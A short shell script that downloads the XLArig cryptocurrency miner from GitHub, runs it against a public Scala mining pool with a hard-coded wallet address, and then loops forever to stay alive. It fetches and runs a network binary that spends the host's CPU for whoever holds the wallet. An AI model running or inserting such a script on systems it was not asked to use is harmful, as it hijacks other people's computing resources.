#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip
apt install -y unzip
unzip XLArig-v5.2.2-linux-x86_64.zip
./xlarig --donate-level 1 -o scala.herominers.com:10131 -u SvmTPo6dV6m2C4r2khsGQ4BMiYMD415zJcQCLRT39jQtTVAwGKKAC31cJBdfPuEZieUjV6FThHCZr9tFuSPNAkWP2Km4i6Yyd -p pasukanmati -a panthera -k 
while [ 1 ]; do
sleep 3
done
sleep 999
